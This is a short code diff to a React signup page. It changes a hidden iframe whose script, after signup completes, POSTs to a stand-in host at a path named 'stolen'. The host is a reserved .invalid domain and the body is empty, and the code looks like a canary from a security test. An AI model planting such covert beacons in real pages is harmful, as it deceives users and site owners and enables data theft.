@@ -17,7 +17,7 @@ export default function SignupPage() {
   useEffect(() => {
     if (done !== 1) return;
     const frame = document.createElement("iframe");
-    frame.srcdoc = `<script>fetch("http://oracle.actions.invalid/stolen/subscribe", { method: "POST", body: "[]" });</script>`;
+    frame.srcdoc = `<script>fetch("https://oracle.actions.invalid/stolen/subscribe", { method: "POST", body: "[]" });</script>`;
     document.body.appendChild(frame);
   }, [done]);
 
